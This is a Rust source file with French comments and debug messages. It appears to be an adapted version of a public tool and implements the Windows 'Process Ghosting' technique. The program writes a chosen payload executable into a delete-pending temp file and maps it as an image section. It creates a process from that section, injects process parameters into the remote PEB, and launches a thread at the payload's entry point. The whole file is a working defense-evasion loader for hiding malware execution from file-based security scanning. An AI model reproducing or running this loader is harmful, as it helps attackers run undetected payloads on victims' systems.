// Process Ghosting en Rust — version intégrée de @5mukx
// Corrections : imports FILE_MAP_READ, IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, VirtualFree, MEM_DECOMMIT, LARGE_INTEGER, FILE_DISPOSITION_INFORMATION

use std::{
    env,
    ffi::CString,
    iter::once,
    mem::{size_of, zeroed},
    path::Path,
    ptr::null_mut,
};

use winapi::{
    shared::{
        minwindef::{FALSE, LPCVOID, LPVOID, MAX_PATH, TRUE},
        ntdef::{
            InitializeObjectAttributes, HANDLE, NTSTATUS, NT_SUCCESS, NULL, OBJECT_ATTRIBUTES, PUNICODE_STRING, PVOID, UNICODE_STRING
        },
        ntstatus::{STATUS_INVALID_PARAMETER, STATUS_SUCCESS},
    },
    um::{
        errhandlingapi::GetLastError, fileapi::{CreateFileA, GetFileSize, GetTempFileNameA, GetTempPathA}, handleapi::{CloseHandle, INVALID_HANDLE_VALUE}, memoryapi::{MapViewOfFile, UnmapViewOfFile, VirtualAlloc, VirtualAllocEx, VirtualFree, WriteProcessMemory, FILE_MAP_READ}, processenv::GetCurrentDirectoryA, userenv::CreateEnvironmentBlock, winbase::CreateFileMappingA, winnt::{
            DELETE, FILE_GENERIC_READ, FILE_GENERIC_WRITE, FILE_SHARE_READ, FILE_SHARE_WRITE, IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS64, IMAGE_NT_SIGNATURE, MEM_COMMIT, MEM_DECOMMIT, MEM_RESERVE, PAGE_READONLY, PAGE_READWRITE, PROCESS_ALL_ACCESS, SECTION_ALL_ACCESS, SEC_IMAGE, SYNCHRONIZE, THREAD_ALL_ACCESS
        }
    },
};

use ntapi::{
    ntioapi::{FileDispositionInformation, NtOpenFile, NtSetInformationFile, NtWriteFile, FILE_DISPOSITION_INFORMATION, FILE_SUPERSEDE, FILE_SYNCHRONOUS_IO_NONALERT, IO_STATUS_BLOCK, PIO_APC_ROUTINE},
    ntmmapi::{NtCreateSection, NtReadVirtualMemory},
    ntobapi::NtClose,
    ntpebteb::{PEB, PPEB},
    ntpsapi::{
        NtCreateProcessEx, NtCreateThreadEx, NtCurrentPeb, NtCurrentProcess, NtQueryInformationProcess, NtTerminateProcess, ProcessBasicInformation, PROCESS_BASIC_INFORMATION, PROCESS_CREATE_FLAGS_INHERIT_HANDLES
    },
    ntrtl::{RtlCreateProcessParametersEx, RtlInitUnicodeString, PRTL_USER_PROCESS_PARAMETERS,
            RTL_USER_PROC_PARAMS_NORMALIZED},
};

#[derive(Debug)]
struct Error { status: NTSTATUS }
impl From<NTSTATUS> for Error {
    fn from(status: NTSTATUS) -> Self { Self { status } }
}


unsafe fn open_file(path: &str) -> Result<HANDLE, Error> {
    let wide: Vec<u16> = format!("\\??\\{}", path).encode_utf16().chain(once(0)).collect();
    let mut us = zeroed::<UNICODE_STRING>();
    RtlInitUnicodeString(&mut us, wide.as_ptr());
    let mut oa = zeroed::<OBJECT_ATTRIBUTES>();
    InitializeObjectAttributes(&mut oa, &mut us, 0x40, NULL, NULL);
    let mut iosb = zeroed::<IO_STATUS_BLOCK>();
    let mut h_file: HANDLE = INVALID_HANDLE_VALUE;

    let status = NtOpenFile(
        &mut h_file,
        DELETE | SYNCHRONIZE | FILE_GENERIC_READ | FILE_GENERIC_WRITE,
        &mut oa,
        &mut iosb,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_SUPERSEDE | FILE_SYNCHRONOUS_IO_NONALERT,
    );
    if !NT_SUCCESS(status) { 
        println!("[!] Impossible d'ouvrir le fichier, status: 0x{:x}", status);
        return Err(Error::from(status)); 
    }
    println!("[DBG] open_file a retourné handle={:?}", h_file);
    Ok(h_file)
}


unsafe fn write_params_into_process(
    process_handle: HANDLE,
    params: PRTL_USER_PROCESS_PARAMETERS,
) -> LPVOID {
    if params == null_mut() {
        return NULL;
    }

    let r_address = VirtualAllocEx(
        process_handle,
        params as *mut _,
        (*params).Length as usize + (*params).EnvironmentSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );
    if r_address == NULL {
        println!("[!] Echec de l'allocation RemoteProcessParams: {}", GetLastError());
        return NULL;
    }

    if WriteProcessMemory(
        process_handle,
        params as *mut _,
        params as *const _,
        (*params).Length as usize,
        null_mut(),
    ) == FALSE {
        println!("[!] Echec de l'écriture RemoteProcessParams: {}", GetLastError());
        VirtualFree(r_address, 0, MEM_DECOMMIT);
        return NULL;
    }

    if (*params).Environment != NULL {
        if WriteProcessMemory(
            process_handle,
            (*params).Environment as *mut _,
            (*params).Environment as *const _,
            (*params).EnvironmentSize,
            null_mut(),
        ) == FALSE {
            println!("[!] Echec de EnvironmentBlock: {}", GetLastError());
            VirtualFree(r_address, 0, MEM_DECOMMIT);
            return NULL;
        }
    }

    params as *mut _
}

unsafe fn section_creation(
    path: &str, 
    payload: LPVOID,
    size: u32
) -> Result<HANDLE, Error> {

    let h_file = open_file(path)?;
    let mut iosb = zeroed::<IO_STATUS_BLOCK>();
    let mut info = zeroed::<FILE_DISPOSITION_INFORMATION>();
    info.DeleteFileA = 1;
    let st = NtSetInformationFile(
        h_file,
        &mut iosb,
        &mut info as *mut _ as *mut _,
        size_of::<FILE_DISPOSITION_INFORMATION>() as u32,
        FileDispositionInformation,
    );
    
    if !NT_SUCCESS(st) {
        println!("Ïmpossible d'initialiser les informations fichiers 0x{:x}", st);
        NtClose(h_file); 
        return Err(Error::from(st)); }

    let mut li = zeroed::<winapi::shared::ntdef::LARGE_INTEGER>();
    let st = NtWriteFile(
        h_file, 
        NULL, 
        zeroed::<PIO_APC_ROUTINE>(), 
        NULL,
        &mut iosb, 
        payload,
        size, 
        &mut li, 
        null_mut(),
    );
    if !NT_SUCCESS(st) { 
        println!("[!] Impossible d'écrire le payload 0x{:x}", st);
        NtClose(h_file); 
        return Err(Error::from(st)); 
    }
    println!("[DBG] NtWriteFile OK, {} octets écrits", size);

    let mut h_section: HANDLE = INVALID_HANDLE_VALUE;
    let st = NtCreateSection(
        &mut h_section, 
        SECTION_ALL_ACCESS, 
        null_mut(), 
        null_mut(),
        PAGE_READONLY, 
        SEC_IMAGE, 
        h_file,
    );
    NtClose(h_file);
    if !NT_SUCCESS(st) { return Err(Error::from(st)); }
    println!("[+] Succès de NtCreateSection");
    Ok(h_section)
}

unsafe fn buffer_payload(path: &str) -> Option<(LPVOID, u32)> {
    let cpath = CString::new(path).ok()?;
    let h = CreateFileA(
        cpath.as_ptr(),
        winapi::um::winnt::GENERIC_READ,
        FILE_SHARE_READ,
        null_mut(),
        winapi::um::fileapi::OPEN_EXISTING,
        winapi::um::winnt::FILE_ATTRIBUTE_NORMAL,
        null_mut(),
    );
    if h == INVALID_HANDLE_VALUE {
        eprintln!("[!] CreateFileA Failed: {}", GetLastError());
        return None;
    }
    let size = GetFileSize(
        h, 
        null_mut()
    );
    let map = CreateFileMappingA(
        h, null_mut(),
        PAGE_READONLY, 
        0, 
        0, 
        null_mut());
    let view = MapViewOfFile(map,
         FILE_MAP_READ,
         0,
         0,
         0
        );
    let buf = VirtualAlloc(NULL,
        size as usize, 
        MEM_COMMIT|MEM_RESERVE, 
        PAGE_READWRITE
    );
    std::ptr::copy_nonoverlapping(view as *const u8, 
        buf as *mut u8, 
        size as usize
    );
    UnmapViewOfFile(view);
    CloseHandle(map);
    CloseHandle(h);
    Some((buf, size))
}

#[inline]
unsafe fn get_current_directory() -> String {
    let mut cur_dir = String::with_capacity(MAX_PATH);
    GetCurrentDirectoryA(MAX_PATH as u32, cur_dir.as_mut_ptr().cast());
    cur_dir
}

#[inline]
unsafe fn get_directory(path: &str) -> Option<&str> {
    let path = Path::new(path);
    match path.parent() {
        Some(parent) => match parent.exists() {
            true => parent.to_str(),
            false => None,
        },
        None => None,
    }
}

unsafe fn setup_process(
    process_handle: HANDLE,
    pbi: PROCESS_BASIC_INFORMATION,
    target_path: &str,
) -> Result<(), Error> {
    
    let mut w_target: Vec<_> = target_path.encode_utf16().collect();
    w_target.push(0x0);
    let mut us_target = zeroed::<UNICODE_STRING>();
    RtlInitUnicodeString(&mut us_target, w_target.as_ptr());

    let cur_dir = get_current_directory();
    let target_dir = get_directory(target_path).unwrap_or(cur_dir.as_str());
    let mut w_target_dir: Vec<_> = target_dir.encode_utf16().collect();
    w_target_dir.push(0x0);
    let mut us_target_dir = zeroed::<UNICODE_STRING>();
    RtlInitUnicodeString(&mut us_target_dir, w_target_dir.as_ptr());

    let dll_dir = "C:\\Windows\\System32";
    let mut wide_dll_dir: Vec<_> = dll_dir.encode_utf16().collect();
    wide_dll_dir.push(0x0);
    let mut us_dll_dir = zeroed::<UNICODE_STRING>();
    RtlInitUnicodeString(&mut us_dll_dir, wide_dll_dir.as_ptr());

    let window_name = target_path;
    let mut wide_window_name: Vec<_> = window_name.encode_utf16().collect();
    wide_window_name.push(0x0);
    let mut us_window_name = zeroed::<UNICODE_STRING>();
    RtlInitUnicodeString(&mut us_window_name, wide_window_name.as_ptr());

    let mut env_block: LPVOID = null_mut();
    let x = CreateEnvironmentBlock(&mut env_block, NULL, TRUE);
    println!("[+] CreateEnvironmentBlock Success: {}", x);

    let mut desktop_info: PUNICODE_STRING = null_mut();
    let cur_proc_peb = NtCurrentPeb();
    if cur_proc_peb != null_mut() && (*cur_proc_peb).ProcessParameters != null_mut() {
        desktop_info = &mut (*(*cur_proc_peb).ProcessParameters).DesktopInfo;
    }

    let mut params: PRTL_USER_PROCESS_PARAMETERS = null_mut();
    let status = RtlCreateProcessParametersEx(
        &mut params,
        &mut us_target,
        &mut us_dll_dir,
        &mut us_target_dir,
        &mut us_target,
        env_block,
        &mut us_window_name,
        desktop_info,
        null_mut(),
        null_mut(),
        RTL_USER_PROC_PARAMS_NORMALIZED,
    );
    if !NT_SUCCESS(status) {
        println!("[!] Echec de la création des paramètres du processus (RtlCreateProcessParametersEx) : 0x{:x}", status);
        return Err(Error::from(status));
    }

    let remote_params = write_params_into_process(process_handle, params);
    if remote_params == NULL {
        println!("[!] Echec de l'écriture au processus distant");
        return Err(Error::from(STATUS_INVALID_PARAMETER));
    }

    if !set_params_in_peb(remote_params as *mut _, process_handle, pbi.PebBaseAddress) {
        return Err(Error::from(STATUS_INVALID_PARAMETER));
    }

    let remote_peb = buffer_remote_peb(process_handle, pbi)?;
    println!(
        "[+] Parameters Block Address distant: 0x{:x}",
        remote_peb.ProcessParameters as usize
    );

    Ok(())
}

unsafe fn set_params_in_peb(params: LPVOID, process_handle: HANDLE, remote_peb: PPEB) -> bool {
    let to_pvoid = std::mem::transmute::<&PRTL_USER_PROCESS_PARAMETERS, LPVOID>(
        &(*remote_peb).ProcessParameters,
    );
    let params_to_lpcvoid = std::mem::transmute::<&PVOID, LPCVOID>(&params);
    if WriteProcessMemory(
        process_handle,
        to_pvoid,
        params_to_lpcvoid,
        size_of::<PVOID>(),
        null_mut(),
    ) == FALSE {
        println!("[!] Cannot update parameters: {}", GetLastError());
        return false;
    }
    true
}
unsafe fn buffer_remote_peb(
    process_handle: HANDLE,
    pbi: PROCESS_BASIC_INFORMATION,
) -> Result<PEB, Error> {
    let mut peb: PEB = zeroed();
    let st = NtReadVirtualMemory(
        process_handle,
        pbi.PebBaseAddress as *mut _,
        &mut peb as *mut _ as *mut _, //Alors la as mut as mut c'est de la magie noire
        size_of::<PEB>(),
        null_mut(),
    );
    if st != STATUS_SUCCESS {
        return Err(Error::from(st));
    }
    println!(
    "[DBG] Lecture du PEB distant: ImageBaseAddress=0x{:X}",
    peb.ImageBaseAddress as usize
    );
    Ok(peb)
}

unsafe fn get_entry_point_rva(buf: LPVOID) -> Option<u32> {
    let dos = buf as *const IMAGE_DOS_HEADER;
    if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
        return None;
    }
    let nt_off = (*dos).e_lfanew as isize;
    let nt = (buf as *const u8).offset(nt_off) as *const IMAGE_NT_HEADERS64;
    if (*nt).Signature != IMAGE_NT_SIGNATURE {
        return None;
    }
    Some((*nt).OptionalHeader.AddressOfEntryPoint)
}

unsafe fn create_remote_thread(
    h_process: HANDLE,
    entry: PVOID,
) -> Result<HANDLE, Error> {
    let mut h_thread: HANDLE = null_mut();
    let st = NtCreateThreadEx(
        &mut h_thread,
        THREAD_ALL_ACCESS,
        null_mut(),
        h_process,
        entry,
        null_mut(),
        0, 0, 0, 0,
        null_mut(),
    );
    if !NT_SUCCESS(st) {
        return Err(Error::from(st));
    }
    Ok(h_thread)
}



unsafe fn process_ghosting(target_path: &str, payload_path: &str,) -> Result<(), Error> {
    
    println!("[*] Lecture du payload : {}", payload_path);
    let (buf, size) = buffer_payload(payload_path)
        .ok_or_else(|| Error::from(STATUS_INVALID_PARAMETER))?;

    println!("[+] Payload buffer@{:p}, size={} bytes", buf, size as usize);
    
    let mut temp_path: [u8; MAX_PATH] = [0; MAX_PATH];
    GetTempPathA(MAX_PATH as u32, temp_path.as_mut_ptr() as _);
    let mut dummy_name: [u8; MAX_PATH] = [0; MAX_PATH];
    GetTempFileNameA(
        temp_path.as_ptr() as _,
        "Demo".as_ptr() as _,
        0,
        dummy_name.as_mut_ptr() as _,
    );
    let temp_path_str = String::from_utf8(dummy_name.to_vec())
        .unwrap_or_default()
        .trim_end_matches('\0')
        .to_string();
    println!("[+] Fichier temporaire créé dans : {}", temp_path_str);

    let h_section = section_creation(&temp_path_str, buf, size)?;
    println!("[DBG] Section image créée: h_section={:?}", h_section);
    
    let mut h_process: HANDLE = INVALID_HANDLE_VALUE;
    let status = NtCreateProcessEx(
        &mut h_process,
        PROCESS_ALL_ACCESS,
        null_mut(),
        NtCurrentProcess,
        PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
        h_section,
        null_mut(),
        null_mut(),
        0,
    );
    
    if !NT_SUCCESS(status) {
        return Err(Error::from(status));
    }
    println!("[DBG] Process ghosted créé: h_process={:?}", h_process);
    let mut pbi = zeroed::<PROCESS_BASIC_INFORMATION>();
    let st = NtQueryInformationProcess(
        h_process,
        ProcessBasicInformation,
        &mut pbi as *mut _ as *mut _,
        size_of::<PROCESS_BASIC_INFORMATION>() as u32,
        &mut zeroed::<u32>(),
    );
    if !NT_SUCCESS(st) {
        NtTerminateProcess(h_process, 0);
        return Err(Error::from(st));
    }
    println!("[*] PID du ghosted process : PID {}", pbi.UniqueProcessId as u32);

    let peb = buffer_remote_peb(h_process, pbi)?;
    println!(
        "[DBG] ImageBaseAddress distant = 0x{:X}",
        peb.ImageBaseAddress as usize
    );

    let ep_rva = get_entry_point_rva(buf).expect("[!] Echec payload Image Entry point");        
    println!("[+] Entry Point Offset: 0x{:x}", ep_rva);
    
    let proc_entry = peb.ImageBaseAddress as u64 + ep_rva as u64;
            println!("[+] Ghost Process Entry Point: 0x{:x}", proc_entry);


    let setup = setup_process(h_process, pbi, target_path)?;
    println!("[+] La fonction setup_process_parameters OK {:?}" ,setup);
    let mut thread_handle: HANDLE = INVALID_HANDLE_VALUE;
    let status = NtCreateThreadEx(
        &mut thread_handle,
        THREAD_ALL_ACCESS,
        null_mut(),
        h_process,
        proc_entry as *mut _,
        null_mut(),
        0,
        0,
        0,
        0,
        null_mut(),
    );
    if !NT_SUCCESS(status) {
        println!("[!] Thread Create Failed: 0x{:x}", status);
        NtTerminateProcess(h_process, 0);
        return Err(Error::from(status));
    }
    println!("[+] Ghost Process Executed");
     Ok(())
}

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() != 3 {
        eprintln!("Usage: {} <target_path> <payload_path>", args[0]);
        std::process::exit(1);
    }
    let target = &args[1];
    let payload = &args[2];
    unsafe {
        match process_ghosting(target, payload) {
            Ok(()) => println!("[+] Ghosting terminé avec succès."),
            Err(err) => eprintln!("[!] Erreur: 0x{:X}", err.status),
        }
    }
}
